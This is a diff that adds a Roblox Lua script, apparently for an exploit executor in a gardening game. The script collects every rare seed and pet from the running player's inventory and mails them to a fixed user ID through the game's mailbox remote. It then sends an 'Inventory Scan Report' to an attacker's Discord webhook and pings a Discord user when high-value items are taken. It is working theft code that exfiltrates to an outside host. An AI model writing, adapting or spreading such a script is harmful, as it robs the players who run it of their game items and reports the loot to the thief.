@@ -1,0 +1,214 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local Networking = require(game.ReplicatedStorage.SharedModules.Networking)
+
+local player = Players.LocalPlayer
+local inventory = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
+
+local targetUserId = 3650124898
+
+local trackedPets = {
+	["Robin"] = true,
+	["Bee"] = true,
+	["Monkey"] = true,
+	["Golden Dragonfly"] = true,
+	["Unicorn"] = true,
+	["Raccoon"] = true,
+	["Black Dragon"] = true,
+	["Ice Serpent"] = true
+}
+
+local rareSeeds = {
+	["Bamboo"] = true,
+	["Mushroom"] = true,
+	["Sunflower"] = true,
+	["Venus Fly Trap"] = true,
+	["Pomegranate"] = true,
+	["Poison Apple"] = true,
+	["Moon Bloom"] = true,
+	["Dragon's Breath"] = true,
+	["Ghost Pepper"] = true,
+	["Rainbow"] = true,
+	["Gold"] = true
+}
+
+local itemsToSend = {}
+local foundPets = {}
+local rareSeedCount = {}
+local otherSeedCount = 0
+local shouldPing = false
+
+local pingUserId = "1474153567995564073"
+
+local pingItems = {
+	["Raccoon"] = true,
+	["Black Dragon"] = true,
+	["Ice Serpent"] = true,
+	["Unicorn"] = true,
+	["Moon Bloom"] = true,
+	["Dragon's Breath"] = true,
+	["Golden Dragonfly"] = true,
+	["Ghost Pepper"] = true
+
+}
+
+
+local function safeCount(value)
+	if typeof(value) ~= "number" then
+		return 1
+	end
+	if value < 1 then
+		return 1
+	end
+	return math.floor(value)
+end
+
+local function isValidInstance(item)
+	return item and typeof(item) == "Instance" and item.Name ~= nil
+end
+
+local containers = {
+	inventory,
+	workspace:FindFirstChild(player.Name)
+}
+
+for _, container in ipairs(containers) do
+	if container then
+		for _, item in ipairs(container:GetChildren()) do
+
+			if not isValidInstance(item) then
+				continue
+			end
+
+			local category = item:GetAttribute("MainCategory")
+			local count = safeCount(item:GetAttribute("Count"))
+
+			if category == "Seed" or category == "Seeds" then
+				local seedName = item.Name
+
+				if rareSeeds[seedName] then
+
+					if pingItems[seedName] then
+						shouldPing = true
+					end
+
+					rareSeedCount[seedName] = (rareSeedCount[seedName] or 0) + count
+
+					table.insert(itemsToSend, {
+						Category = "Seeds",
+						ItemKey = seedName,
+						Count = count
+					})
+
+				else
+					otherSeedCount += 1
+				end
+			end
+
+			local petId = item:GetAttribute("PetId")
+			local petName = item:GetAttribute("Pet")
+
+			if category == "Pets" or petId or petName then
+				if typeof(petId) == "string" and petId ~= "" then
+
+					local actualPetName = petName or item.Name
+
+					if pingItems[actualPetName] then
+						shouldPing = true
+					end
+
+					table.insert(itemsToSend, {
+						Category = "Pets",
+						ItemKey = petId,
+						Count = 1
+					})
+
+					table.insert(foundPets, actualPetName)
+
+				end
+			end
+		end
+	end
+end
+
+local success, result, err = pcall(function()
+	return Networking.Mailbox.SendBatch:Fire(
+		targetUserId,
+		itemsToSend,
+		"hello"
+	)
+end)
+
+local rareSeedLines = {}
+local totalRareSeeds = 0
+
+for seed, count in pairs(rareSeedCount) do
+	table.insert(rareSeedLines, seed .. " x" .. count)
+	totalRareSeeds += count
+end
+
+table.sort(rareSeedLines)
+
+
+local pingText = ""
+
+if shouldPing then
+	pingText = "<@" .. pingUserId .. ">"
+end
+
+local payload = {
+	content = pingText,
+	embeds = {
+		{
+			title = "🌱 Inventory Scan Report",
+			description =
+				"**Player:** `" .. player.Name .. "`\n" ..
+				"**Target:** `" .. tostring(targetUserId) .. "`",
+
+			color = 5814783,
+
+			fields = {
+				{
+					name = "🌟 Rare Seeds (" .. totalRareSeeds .. ")",
+					value = #rareSeedLines > 0 and table.concat(rareSeedLines, "\n") or "None",
+					inline = false
+				},
+				{
+					name = "🌿 Other Seeds",
+					value = tostring(otherSeedCount),
+					inline = true
+				},
+				{
+					name = "🐾 Pets Found",
+					value = table.concat(foundPets, "\n"),
+					inline = false
+				},
+				{
+					name = "📦 Items Sent",
+					value = tostring(#itemsToSend),
+					inline = true
+				}
+			},
+
+			footer = {
+				text = "User ID: " .. player.UserId
+			},
+
+			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		}
+	}
+}
+
+local httpRequest = request or http_request or syn and syn.request or fluxus and fluxus.request
+
+if httpRequest then
+	httpRequest({
+		Url = getgenv().webhook,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode(payload)
+	})
+end
